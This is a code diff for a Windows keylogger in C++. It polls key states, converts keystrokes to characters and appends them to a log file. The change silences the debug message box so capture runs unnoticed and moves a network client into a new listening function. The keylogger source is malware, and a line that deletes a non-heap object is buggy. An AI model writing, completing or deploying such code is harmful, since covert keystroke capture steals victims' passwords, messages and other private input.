@@ -1,3 +1,5 @@
+#pragma once
+#include "stdafx.h"
 #include "keylogger.h"
 #include "utils.h"
 #include "Client.h"
@@ -18,10 +20,10 @@ void KeyLoggerLoop()
 		{
 			if (GetAsyncKeyState(i) == -32767)
 			{
-			
+
 				key[0] = (char)MapVirtualKeyA(i, MAPVK_VK_TO_CHAR);
 				key[1] = 0;
-				MessageBoxA(0, key, "KEY", MB_OK); // just to debug
+				//MessageBoxA(0, key, "KEY", MB_OK); // just to debug
 				log_file.AppendString((char*)key);
 			}
 		}
@@ -35,15 +37,21 @@ void StopKeyLogger()
 }
 
 void StartKeyLogger()
-{
+{ 
 	// do initialization code
 	IsKeyLoggerRunning = true;
-	Client* client = new Client();
 	
+	
+
 	// finally loop
 	KeyLoggerLoop();
+
 
 	// do finalization code
 	delete &log_file;
 }
 
+void StartListen()
+{
+	Client client;
+}
